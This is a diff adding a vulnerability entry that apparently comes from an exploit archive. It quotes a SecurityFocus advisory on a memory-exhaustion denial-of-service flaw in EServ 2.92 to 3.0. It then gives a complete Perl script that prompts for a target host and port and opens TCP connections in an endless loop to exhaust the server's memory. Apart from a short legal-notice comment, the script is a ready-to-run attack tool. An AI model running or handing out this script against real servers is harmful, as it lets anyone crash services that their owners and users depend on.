@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/7552/info
+
+A denial of service vulnerability has been reported for EServ. The vulnerability exists due to the way the server handles connections. Specifically, memory allocated for open connections are not properly freed when a connection no longer exists. This will result in a consumption of all available memory resources.
+
+**It has been reported that EServ version 3.0 previously thought to be invulnerable to this issue is affected by this vulnerability. This version was tested on Windows 2000.
+
+This vulnerability affects EServ 2.92 to 3.0. 
+
+#!/usr/bin/perl
+#LEGAL NOTICE: Don't test this on networks you don't administer,
+#and do not test this tool on networks you don't own without
+#permission of the network owner.  You are responsible for all
+#damage due to your use of this tool.
+use IO::Socket;
+print "$0: eServ Remote DoS Exploit\r\n";
+print "By Matthew Murphy \<mattmurphy\@kc.rr.com\>\r\n\r\n";
+print "Server hostname\: ";
+$host = trim(chomp($line = <STDIN>));
+print "Service port to probe\: ";
+$port = trim(chomp($line = <STDIN>));
+print "\r\nBeginning probe -- stop with CTRL+C\r\n";
+while (1) {
+ $f = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host:$port");
+ undef $f;
+}
